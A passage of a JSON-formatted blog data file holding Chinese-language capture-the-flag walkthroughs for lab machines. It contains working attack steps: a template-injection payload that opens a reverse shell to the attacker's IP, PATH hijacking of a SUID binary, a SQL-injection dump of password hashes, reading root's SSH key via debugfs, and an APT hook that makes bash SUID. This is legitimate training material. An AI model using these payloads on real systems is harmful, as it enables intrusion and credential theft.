gid=1001(maria) grupos=1001(maria)\n\n```\n\n\u5c1d\u8bd5\u63d0\u6743\u3002\n\n```bash\nmaria@TheHackersLabs-Offensive:~$ sudo -l\nsudo: unable to resolve host TheHackersLabs-Offensive: Nombre o servicio desconocido\n[sudo] contrase\u00f1a para maria: \nsudo: a password is required\nmaria@TheHackersLabs-Offensive:~$ ls -la\ntotal 132\ndrwx------ 3 maria maria  4096 dic 31 05:35 .\ndrwxr-xr-x 3 root  root   4096 dic 29 15:41 ..\n-rwsr-xr-x 1 root  root  16056 dic 26 10:22 app\n-rw-r--r-- 1 maria maria    67 dic 26 11:20 backup.txt\n-rw------- 1 maria maria    29 dic 29 15:41 .bash_history\n-rw-r--r-- 1 maria maria   220 mar 29  2024 .bash_logout\n-rw-r--r-- 1 maria maria  3526 mar 29  2024 .bashrc\n-rw-r--r-- 1 maria maria 55646 dic  9  2021 GyMG.jpg\n-rw-r--r-- 1 maria maria  4629 dic 27 10:14 index.php\n-rw------- 1 maria maria    20 dic 26 11:59 .lesshst\ndrwxr-xr-x 3 maria maria  4096 dic 25 06:02 .local\n-rw-r--r-- 1 maria maria   257 dic 25 18:46 logout.php\n-rw-r--r-- 1 maria maria   807 mar 29  2024 .profile\n-rw-r--r-- 1 maria maria    29 dic 31 05:35 user.txt\n-rw-r--r-- 1 maria maria  4721 dic 27 07:47 welcome.php\n\n```\n\n\u8fd9\u4e2aapp\u6709\u70b9\u610f\u601d\u3002\n\n```bash\nmaria@TheHackersLabs-Offensive:~$ strings app \n/lib64/ld-linux-x86-64.so.2\nputs\nsetuid\nsystem\n__libc_start_main\n__cxa_finalize\nlibc.so.6\nGLIBC_2.2.5\nGLIBC_2.34\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nPTE1\nu+UH\n[*] Mostrando las primeras 8 l\nneas del archivo /etc/shadow \n/usr/bin/head -n 8 /etc/shadow\nhead -n 8 /etc/shadow\n;*3$'\nGCC: (Debian 12.2.0-14) 12.2.0\nScrt1.o\n__abi_tag\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.0\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\napp.c\n__FRAME_END__\n_DYNAMIC\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_start_main@GLIBC_2.34\n_ITM_deregisterTMCloneTable\nputs@GLIBC_2.2.5\n_edata\n_fini\nsystem@GLIBC_2.2.5\n__data_start\n__gmon_start__\n__dso_handle\n_IO_stdin_used\n_end\n__bss_start\nmain\n__TMC_END__\n_ITM_registerTMCloneTable\nsetuid@GLIBC_2.2.5\n__cxa_finalize@GLIBC_2.2.5\n_init\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.gnu.property\n.note.gnu.build-id\n.note.ABI-tag\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n\n```\n\n\u50cf\u662f\u6267\u884c\u4e86`head -n 8 /etc/shadow`\uff0c\u6211\u4eec\u6258\u53bbIDA\u4e00\u63a2\u771f\u5bb9\u3002\n\n![image](https://github.com/user-attachments/assets/b2985cc2-ac93-42bb-8b22-08668879ff48)\n\n\u731c\u7684\u6ca1\u9519\uff0c\u6211\u4eec\u547d\u4ee4\u6ce8\u5165\u4e00\u4e0b\u3002\n\n```bash\nmaria@TheHackersLabs-Offensive:~$ echo 'chmod u+s /bin/bash' > head\nmaria@TheHackersLabs-Offensive:~$ chmod +x head \nmaria@TheHackersLabs-Offensive:~$ export PATH=/home/maria:$PATH\nmaria@TheHackersLabs-Offensive:~$ which head \n/home/maria/head\nmaria@TheHackersLabs-Offensive:~$ ls -la /bin/bash\n-rwxr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash\nmaria@TheHackersLabs-Offensive:~$ ./app\n\n\n[*] Mostrando las primeras 8 l\u00edneas del archivo /etc/shadow \n\nroot:$y$j9T$2mXNTjVfEEjRt6t2uVu7k0$RBnftcaGot4JsJ8DHVuo0LkG8UuuKR68CdazrjK2Rf8:20088:0:99999:7:::\ndaemon:*:20066:0:99999:7:::\nbin:*:20066:0:99999:7:::\nsys:*:20066:0:99999:7:::\nsync:*:20066:0:99999:7:::\ngames:*:20066:0:99999:7:::\nman:*:20066:0:99999:7:::\nlp:*:20066:0:99999:7:::\n\n\n[*] Mostrando las primeras 8 l\u00edneas del archivo /etc/shadow \n\nmaria@TheHackersLabs-Offensive:~$ ls -la /bin/bash\n-rwsr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash\nmaria@TheHackersLabs-Offensive:~$ bash -p\nbash-5.2# id\nuid=1001(maria) gid=1001(maria) euid=0(root) grupos=1001(maria)\n\n```\n\n---\n\n## 5.\u603b\u7ed3\n\n\u53bb\u7784\u4e86`ll104567`\u5927\u4f6c\u7684wp\uff0c\u53d1\u73b0WordPress\u90a3\u91cc\u53ef\u4ee5\u4f7f\u7528**wpscan**\u626b\u63cf\u5168\u90e8\u63d2\u4ef6\n\n```bash\nwpscan --url http://192.168.205.213 -e ap,u --plugins-detection aggressive --api-token xxx\n```sentence", "top": 0, "createdAt": 1751016836, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P120": {"htmlDir": "docs/post/thl_sinplomo98-bi-ji.html", "labels": ["thehackerlabs"], "postTitle": "thl_sinplomo98\u7b14\u8bb0", "postUrl": "post/thl_sinplomo98-bi-ji.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/120", "commentNum": 0, "wordCount": 2142, "description": "# thl_sinplomo98\u7b14\u8bb0\n\n**\u9776\u673a**\uff1ahttps://thehackerslabs.com/sinplomo98/\n**\u96be\u5ea6**\uff1a\u9ad8\u7ea7\uff08AVANZADO\uff09\n**\u653b\u51fbip**:192.168.205.141\n**\u9776\u673aip**:192.168.205.157\n\n# 1.\u7aef\u53e3\u626b\u63cf\n\n\u9996\u5148\u4f7f\u7528`nmap`\u626b\u63cf\u76ee\u6807\u673a\u5668\u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```\nnmap 192.168.205.157\n```\n\n![image](https://github.com/user-attachments/assets/35d20d5f-2eb5-461b-a2aa-e2ff6bcdff3f)\n\n\u901a\u8fc7\u626b\u63cf\uff0c\u53d1\u73b0\u76ee\u6807\u673a\u5668\u4e0a\u5f00\u653e\u4e86\u591a\u4e2a\u7aef\u53e3\uff0c\u5176\u4e2d21\u7aef\u53e3\uff08FTP\u670d\u52a1\uff09\u548c5000\u7aef\u53e3\uff08Web\u670d\u52a1\uff09\u6211\u6bd4\u8f83\u611f\u5174\u8da3\u3002\n\u5148\u770b21 ftp\u670d\u52a1\n\n# 2. FTP\u670d\u52a1\u63a2\u6d4b\n\n```\nftp 192.168.205.157\n\n#\u4f7f\u7528\u533f\u540d\u767b\u5f55\nanonymous \nanonymous\n\nls\nmget supermegaultraimportantebro.txt\ncat supermegaultraimportantebro.txt\n```\n\n![image](https://github.com/user-attachments/assets/0a02e140-b0df-406b-bd17-2251aa43f2ea)\n\u5475\uff01\u5c31\u4e0d[\u72d7\u5934]\n\n# 3. Web\u670d\u52a1\u63a2\u6d4b\n\n\u63a5\u4e0b\u6765\uff0c\u8bbf\u95ee\u76ee\u6807\u768480\u7aef\u53e3\uff0c\u8fdb\u884c\u6a21\u7cca\u6d4b\u8bd5\uff0c\u4f46\u672a\u80fd\u53d1\u73b0\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f\u3002\u7ee7\u7eed\u63a2\u6d4b5000\u7aef\u53e3\uff0c\u53d1\u73b0\u662fWeb\u670d\u52a1\u3002\n\n\u770b\u770b\u6e90\u4ee3\u7801\u6709\u6ca1\u6709\u63d0\u793a\n\n![image](https://github.com/user-attachments/assets/ff805305-85d4-4c31-8d64-2dc135498bc4)\n\n\u6839\u636e\u9875\u9762\u7684\u63d0\u793a\uff0c\u52a0\u4e0a\u8def\u5f84\u6d4b\u8bd5\u3002\n\n![image](https://github.com/user-attachments/assets/fb34ab9b-90d7-4373-beb6-04948a83a1f0)\n\n# 4.SSTI\u5229\u7528\n\n\u7ecf\u6d4b\u8bd5\uff0c\u786e\u8ba4\u8be5Web\u670d\u52a1\u5b58\u5728Server-Side Template Injection\uff08SSTI\uff09\u6f0f\u6d1e\n[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)\n\u5c1d\u8bd5\u6267\u884c\u57fa\u672c\u7684\u6a21\u677f\u8bed\u6cd5\uff1a\n\n```\n{{8*8}}\n```\n\n\u901a\u8fc7\u4ee5\u4e0bpayload\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4\uff1a\n\n```\n{% for x in [].__class__.__base__.__subclasses__() %}\n    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}\n        {{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.205.141',8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')')}}\n    {% endif %}\n{% endfor %}\n\n```\n\n# 5. \u6743\u9650\u63d0\u5347\n\n\u4f7f\u7528Linpeas\u811a\u672c\u8fdb\u884c\u6743\u9650\u63d0\u5347\u68c0\u67e5\uff0c\u53d1\u73b0\u76ee\u6807\u7cfb\u7edf\u5c5e\u4e8edisk\u7ec4\u5e76\u5b58\u5728SUID\u63d0\u53d6\u6f0f\u6d1e\u3002\n\n[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group)\n\n```\n#\u67e5\u770b\u7cfb\u7edf\u5206\u533a\u548c\u6587\u4ef6\u7cfb\u7edf\u4fe1\u606f\ndf -h\n#\u4f7f\u7528debugfs\u67e5\u770b\u6587\u4ef6\ndebugfs /dev/sda1\ndebugfs: cat /root/.ssh/id_rsa\n```\n\n\u901a\u8fc7\u62ff\u5230id_rsa\u6587\u4ef6\u540e\uff0c\u4f7f\u7528John\u8fdb\u884c\u7206\u7834\uff0c\u6700\u7ec8\u83b7\u53d6root\u6743\u9650\u3002sentence", "top": 0, "createdAt": 1751016839, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P121": {"htmlDir": "docs/post/thl_THLCPPT_V16-bi-ji.html", "labels": ["thehackerlabs"], "postTitle": "thl_THLCPPT_V16\u7b14\u8bb0", "postUrl": "post/thl_THLCPPT_V16-bi-ji.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/121", "commentNum": 0, "wordCount": 6007, "description": "# thl_THLCPPT_V16\u7b14\u8bb0\n\n**\u9776\u673a**\uff1ahttps://thehackerslabs.com/thlcpptv16/\n\n**\u96be\u5ea6**\uff1a\u4e13\u5bb6\uff08EXPERTO\uff09\n\n**\u76ee\u6807 IP**\uff1a192.168.205.152\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b\n\n\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```\nnmap 192.168.205.152\n```\n\n![image](https://github.com/user-attachments/assets/c9e617e5-96af-47a7-832e-7ea63715d9d6)\n\n\u8bbf\u95ee 80 \u7aef\u53e3\n\n![image](https://github.com/user-attachments/assets/b8625cb6-3e5c-483b-aa82-6ccbfc550f2a)\n\n\u70b9\u51fb Ir al Examen \u53d1\u73b0\u5b50\u57df\uff0c\u5206\u522b\u4e3a\uff1a\n\n1. examen.thlcpptv16.thl\n2. thlcpptv16.thl\n\n\u5c06\u8fd9\u4e24\u4e2a\u57df\u540d\u6dfb\u52a0\u5230 `/etc/hosts` \u6587\u4ef6\u4e2d\uff0c\u8fdb\u4e00\u6b65\u63a2\u67e5\u3002\n\n![image](https://github.com/user-attachments/assets/dc44dd45-d812-4514-ac6b-8d114af6acba)\n\n\u6253\u5f00 `examen.thlcpptv16.thl`\uff0c\u53d1\u73b0\u76ee\u6807\u8fd0\u884c\u4e86 **WordPress**\u3002\n\n# 2.Wordpress \u679a\u4e3e\n\n\u4f7f\u7528 **wpscan** \u8fdb\u884c WordPress \u7528\u6237\u679a\u4e3e\uff1a\n\n```\nwpscan --url examen.thlcpptv16.thl -e vp,u --api-token xxx   #api-token\u6ce8\u518cwpscan\u5b98\u7f51\u83b7\u53d6\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u4ee5\u4e0b\u7528\u6237\uff1a\n\n1. **examinador**\n2. **tom**\n3. **jerry**\n\n![image](https://github.com/user-attachments/assets/9bcae154-f035-4d1d-b807-d6722bc3749a)\n\n\u7528\u6237\u8f83\u591a\uff0c\u56e0\u6b64\u6211\u4eec\u5c1d\u8bd5 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002\u5173\u4e8e\u8be5\u6f0f\u6d1e\u7684\u66f4\u591a\u4fe1\u606f\u53ef\u4ee5\u53c2\u8003\n\n> [!IMPORTANT]\n>\n> 1. https://wpscan.com/vulnerability/2b5860f1-f029-496a-a479-082b78c5bda4\n> 2. https://www.tenable.com/security/research/tra-2023-40\n\n![image](https://github.com/user-attachments/assets/d54e46b9-e1d9-4ae4-959d-533c500828fc)\n\n![image](https://github.com/user-attachments/assets/48e4be02-5f6e-4566-bd5c-134fbc36e90d)\n\n# 3.SQL \u6ce8\u5165\u6f0f\u6d1e\u5229\u7528\n\n\u5c1d\u8bd5\u6784\u9020 SQL \u6ce8\u5165 payload\uff0c\u5229\u7528\u6f0f\u6d1e\u83b7\u53d6 WordPress \u6570\u636e\u5e93\u4e2d\u7684\u7528\u6237\u4fe1\u606f\uff1a\n\n```\nhttp://examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&to=1*\n```\n\n\u7136\u540e\u4f7f\u7528 **sqlmap** \u8fdb\u884c\u81ea\u52a8\u5316\u6ce8\u5165\uff0c\u63d0\u53d6\u7528\u6237\u4fe1\u606f\uff1a\n\n```\nsqlmap -u 'examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&to=1*' --batch -D wordpress -T wp_users -C user_login,user_pass --dump\n```\n\n\u8f93\u51fa\u5982\u4e0b\uff0c\u6210\u529f\u83b7\u53d6\u5230\u7528\u6237\u7684\u54c8\u5e0c\u5bc6\u7801\uff1a\n\n```\n+------------+------------------------------------+\n| user_login | user_pass                          |\n+------------+------------------------------------+\n| jerry      | $P$B0uohNeAjd6aq3n0dv6NC7Nhkro0Kt. |\n| examinador | $P$B43UAoTTnv0stdbxGqzwyQtyXm86x/1 |\n| tom        | $P$BJrv/Sv/rBlufcIW5FiMdUW4lA5UrN1 |\n+------------+------------------------------------+\n```\n\n# 4.Hash \u5bc6\u7801\u7206\u7834\n\n\u4f7f\u7528 **hashid** \u5de5\u5177\u8bc6\u522b\u54c8\u5e0c\u7b97\u6cd5\uff1a\n\n```\nhashid -e hash\n```\n\n![image](https://github.com/user-attachments/assets/3e569c79-85a8-4b52-974f-91f1505f192b)\n\n\u7136\u540e\u4f7f\u7528 **hashcat** \u8fdb\u884c\u5bc6\u7801\u7206\u7834\uff1a\n\n```\nhashcat -a 0 -m 400 hash /usr/share/wordlists/q5000.txt\n```\n\n![image](https://github.com/user-attachments/assets/46a062a2-b8ac-46dd-9edc-2a7030aa7854)\n\n\u7206\u7834\u6210\u529f\uff0c\u83b7\u5f97\u4e86 `tom` \u7528\u6237\u51ed\u8bc1\n\n# 5.WrapWrap Filter \u6f0f\u6d1e\n\n> [!IMPORTANT]\n> https://github.com/ambionics/wrapwrap\n\n![image](https://github.com/user-attachments/assets/d2ff7f6f-34e7-4931-885f-74ce45c5b96e)\n\n![image](https://github.com/user-attachments/assets/d618e2ae-0b45-4a3c-856d-5d24b5838035)\n\n\u901a\u8fc7\u5229\u7528WrapWrap\u6f0f\u6d1e\uff0c\u6784\u9020\u653b\u51fb\uff1a\n\n```\ngit clone https://github.com/ambionics/wrapwrap.git\ngit clone https://github.com/cfreal/ten.git\ncd ten\npython3 -m venv ./venv\nsource ./venv/bin/activate\npip install .\npython3 wrapwrap.py /etc/passwd '{'message':'' ''}' 1300\npython3 -m http.server 9000\n```\n\n![image](https://github.com/user-attachments/assets/8fa3956f-d1ea-40cf-8659-ecb8a3a52f04)\n\n\u770b\u770b\u4ed6\u63d0\u793a\u7684\u6cc4\u6f0f\u4fe1\u606f\u662f\u4ec0\u4e48\n\n```\npython3 wrapwrap.py /var/www/examen.thlcpptv16.thl/wp-config.php  '{'message':'' ''}' 1300\n```\n\n![image](https://github.com/user-attachments/assets/08eb3101-eae7-4d76-b161-a2923014f797)\n\n\u6210\u529f\u901a\u8fc7 `wrapwrap.py` \u83b7\u53d6 tom \u5bc6\u7801\u3002\n\n# 6.SSH \u767b\u5f55\u4e0e\u63d0\u6743\n\n\u67e5\u770b tom \u5bb6\u76ee\u5f55\u4e0b\u7684\u654f\u611f\u4fe1\u606f\n\n![image](https://github.com/user-attachments/assets/abb3f249-2485-4f6e-ac74-4ad80a8b5dea)\n\n```\ncat ./bashrc\n```\n\n![image](https://github.com/user-attachments/assets/f94ac21e-1b78-43cf-83e2-d562255805d3)\n\n\u53d1\u73b0\u4e00\u4e2a rafael \u7528\u6237\u7684\u5e10\u53f7\u548c\u5bc6\u7801\n\n![image](https://github.com/user-attachments/assets/65b15b69-d3a3-47d4-888a-918e43705fb3)\n\n\u5728/var/backup/\u76ee\u5f55\u4e0a\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a **passwd.dll** \u7684\u6587\u4ef6\uff0c\u5c5e\u4e8e\u7528\u6237 `jerry`\u3002\u867d\u7136\u5185\u5bb9\u662f\u53ef\u8bfb\u7684\uff0c\u4f46\u4f3c\u4e4e\u4f7f\u7528\u4e86\u67d0\u79cd\u7f16\u7801\u3002\n\u6700\u540e\u901a\u8fc7\u4f7f\u7528rot13\u89e3\u7801\u83b7\u5f97\u5176\u5185\u5bb9\u8fdb\u884c\u89e3\u7801\uff0c\u6210\u529f\u83b7\u53d6\u4e86 `jerry` \u7528\u6237\u7684 SSH \u5bc6\u94a5\n\n> [!IMPORTANT]\n> https://rot13.com/\n\n\u6709\u4e86\u8fd9\u4e9b\u51ed\u8bc1\uff0c\u6211\u4eec\u8981\u505a\u7684\u7b2c\u4e00\u4ef6\u4e8b\u5c31\u662f\u8fdb\u5165 Rafael \u7684\u673a\u5668\u3002\n\n![image](https://github.com/user-attachments/assets/587d5b54-120a-41f7-9358-20f254f98481)\n\n\u67e5\u770b sudo \u6743\u9650\u770b\u770b\u6709\u6ca1\u6709\u60ca\u559c\n\n![image](https://github.com/user-attachments/assets/6f8a870e-d91e-45b6-a838-32bbd15fcdcc)\n\nvim \u63d0\u6743\u6709\u5f88\u591a\u65b9\u5f0f\uff0c\u53ef\u4ee5\u901a\u8fc7 gtfobins\u67e5\u770b\uff0c\u6211\u7684\u65b9\u5f0f\u662f\u8fdb\u5165 vim \u7136\u540e\u8fdb\u5165\u547d\u4ee4\u6a21\u5f0f,`!/bin/bash` \u63d0\u6743\n\n> [!IMPORTANT]\n> https://gtfobins.github.io/\n\n\u5177\u4f53\u5c31\u662f\u5148\u8f93\u5165 `:` \u518d\u8f93\u5165 `!/bin/bash`\n\n# 7.VPN \u96a7\u9053\u4e0e\u8fdb\u4e00\u6b65\u6e17\u900f\n\n\u67e5\u770b `\u6839` \u76ee\u5f55\uff0c\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `tunnelRafael.conf` \u7684\u6587\u4ef6\uff0c\u5b83\u4e0e VPN\uff08\u865a\u62df\u4e13\u7528\u7f51\u7edc\uff09\u5de5\u5177 WireGuard \u7684\u5178\u578b\u914d\u7f6e\u76f8\u5339\u914d\u3002\n\n![image](https://github.com/user-attachments/assets/e53b5f4b-799e-44cb-86b5-bebcbe269a2a)\n\n\u5148\u4f7f\u7528Ligolo-NG\u628a\u96a7\u9053\u5efa\u7acb\u4e00\u4e0b\n\n> [!IMPORTANT]\n> https://github.com/nicocha30/ligolo-ng\n\n```\nsudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add 172.101.0.0/28 dev ligolo\n./ligolo-agent -connect 192.168.205.141:11601 -ignore-cert\nligolo-proxy -selfcert\n```\n\n\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u4f7f\u7528\u4ee3\u7406\u624b\u6bb5\u5728\u76ee\u6807\u7f51\u7edc\u5185\u4e86\uff0c\u7136\u540e\u901a\u8fc7 WireGuard \u8fde\u63a5 VPN\uff08\u8fd9\u91cc\u8bb0\u5f97\u628a `tunnelRafael.conf` \u6258\u5230\u653b\u51fb\u673a\uff09\n\n```\nsudo apt install wireguard-tools resolvconf\nwg-quick up tunnelRafael.conf\n```\n\n![image](https://github.com/user-attachments/assets/bf6081a9-6418-4531-ba38-ecf7af7afbfb)\n\n\u5efa\u7acb\u6210\u529f\uff0c\u7f51\u6bb5\u4e3a 10.13.13.0/24\n\n\u626b\u63cf\u5230\u901a\u8fc7 VPN \u5efa\u7acb\u7684\u5b50\u7f51 **10.13.13.0/24**\n\n```\nfping -asgq 10.13.13.0/24\n```\n\n![image](https://github.com/user-attachments/assets/53939c0f-4585-4095-9e62-4b4d3b66c8b8)\n\n\u6839\u636e\u63a8\u6d4b\u53ef\u4ee5\u770b\u51fa\u5e94\u8be5\u662f 10.13.13.3\uff0c\u626b\u63cf\u4e00\u4e0b 22 \u7aef\u53e3\u662f\u4e0d\u662f\u5f00\u653e\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u8fd8\u6709\u4e00\u4e2a `jerry` \u7528\u6237\u4fe1\u606f\u6ca1\u7528\u8fc7\n\n```\nnmap -p22 -Pn 10.13.13.3\n```\n\n![image](https://github.com/user-attachments/assets/22fc3b72-3125-4a48-954d-3828b7e2d389)\n\n\u786e\u5b9e\u662f\u5f00\u653e\u7684\uff0c\u8fde\u63a5\u4e0a\u53bb\n\n![image](https://github.com/user-attachments/assets/5775c59b-9752-47a6-aae0-e17ac45e9efa)\n\n\u7529\u4e86\u4e00\u4e2a Linpeas \u811a\u672c,\u6211\u4eec\u5f97\u77e5\u7528\u6237 `jerry` \u5c5e\u4e8e `sistema` \u7ec4\uff0c\u4ed6\u80fd\u591f\u5199\u5165 `/etc/apt/apt.conf.d`\uff0c\u90a3\u6211\u4eec\u53ef\u4ee5\u5728\u66f4\u65b0\u8f6f\u4ef6\u5305\u4f7f\u7528 APT \u547d\u4ee4\u4fee\u6539 bash \u6743\u9650\u3002\n\n```\necho 'APT::Update::Pre-Invoke:: {'chmod u+s /bin/bash'};' > /etc/apt/apt.conf.d/01ab\n```\n\n![image](https://github.com/user-attachments/assets/5dd2d63a-355a-4480-a0ba-da2cbdf81215)\n\n\u627e\u5230\u4e86 **jerry** \u51ed\u8bc1\uff0c\u4f7f\u7528\u8fd9\u4e2a\u51ed\u8bc1\u518d\u91cd\u65b0\u8fde\u63a5\u4e3b ip\n\n![image](https://github.com/user-attachments/assets/5b778922-ef9e-4af3-b23d-d2a28a2f7b02)\n\n\u67e5\u770b sudo \u6743\u9650\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u53ef\u4ee5**\u4ee5 root \u8eab\u4efd\u8fd0\u884c nginx\uff0c**  \u901a\u8fc7 google \u641c\u7d22\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u5173\u4e8enginx \u7684\u6f0f\u6d1e\n\n> [!IMPORTANT]\n> https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406\n\n```\n./exploit.sh\nssh -i /home/jerry/.ssh/id\\_rsa root@127.0.0.1\n```\n\n\u62ff\u4e0b rootsentence", "top": 0, "createdAt": 1751016841, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-important {border-left-color:var(--borderColor-done-emphasis, var(--color-done-emphasis));background-color:var(--color-done-subtle);}.markdown-alert.markdown-alert-important .markdown-alert-title {color: var(--fgColor-done,var(--color-done-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P122": {"htmlDir": "docs/post/vulnhub_Funbox_ GaoKao.html", "labels": ["vulnhub"], "postTitle": "vulnhub_Funbox_ GaoKao", "postUrl": "post/vulnhub_Funbox_%20GaoKao.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/122", "commentNum": 0, "wordCount": 15778, "description": "# vulnhub_Funbox: GaoKao\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1ahttps://vulnhub.com/entry/funbox-gaokao,707/  \n**\u96be\u5ea6**\uff1a\u7eff\u8272  \n**\u76ee\u6807 IP**\uff1a192.168.205.152  \n**\u672c\u673a IP**\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\n\u200b`nmap`\u200b\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n --min-rate 10000 192.168.205.152\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 17:56 CST\nNmap scan report for 192.168.205.152\nHost is up (0.00025s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     ProFTPD 1.3.5e\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 48:39:31:22:fb:c2:03:44:a7:4e:c0:fa:b8:ad:2f:96 (RSA)\n|   256 70:a7:74:5e:a3:79:60:28:1a:45:4c:ab:5c:e7:87:ad (ECDSA)\n|_  256 9c:35:ce:f6:59:66:7f:ae:c4:d1:21:16:d5:aa:56:71 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Wellcome to Funbox: Gaokao !\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1\n| ssl-cert: Subject: commonName=MySQL_Server_5.7.34_Auto_Generated_Server_Certificate\n| Not valid before: 2021-06-05T15:15:30\n|_Not valid after:  2031-06-03T15:15:30\n|_ssl-date: TLS randomness does not represent time\n| mysql-info: \n|   Protocol: 10\n|   Version: 5.7.34-0ubuntu0.18.04.1\n|   Thread ID: 3\n|   Capabilities flags: 65535\n|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, IgnoreSpaceBeforeParenthesis, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, IgnoreSigpipes, SupportsLoadDataLocal, SupportsCompression, ODBCClient, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults\n|   Status: Autocommit\n|   Salt: w5w-\\x05[lh(@\\x08Zp*'=C:\\x01\\x10\n|_  Auth Plugin Name: mysql_native_password\nMAC Address: 08:00:27:84:89:FF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.25 ms 192.168.205.152\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.41 seconds\n                                      \n```\n\nGaokao\u53ef\u80fd\u662f\u4e00\u4e2a\u7528\u6237\n\n# 